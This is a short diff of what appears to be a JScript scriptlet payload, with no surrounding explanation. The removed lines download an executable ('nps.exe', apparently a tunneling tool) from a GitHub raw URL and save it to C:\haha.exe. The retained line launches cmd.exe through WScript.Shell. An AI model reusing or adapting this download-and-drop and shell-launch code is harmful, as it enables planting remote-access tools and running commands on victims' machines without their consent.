@@ -28,16 +28,6 @@
   } 
   } 
   } 
-  if(xGet != null){ 
-  xGet.Open("GET","https://raw.githubusercontent.com/kxcode/download/master/nps.exe",0); 
-  xGet.Send(); 
-  sGet.Mode=3; 
-  sGet.Type=1; 
-  sGet.Open(); 
-  sGet.Write(xGet.ResponseBody); 
-  sGet.SaveToFile("C:\\haha.exe",2); 
-  }
-
   var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
 ]]>
 </script>
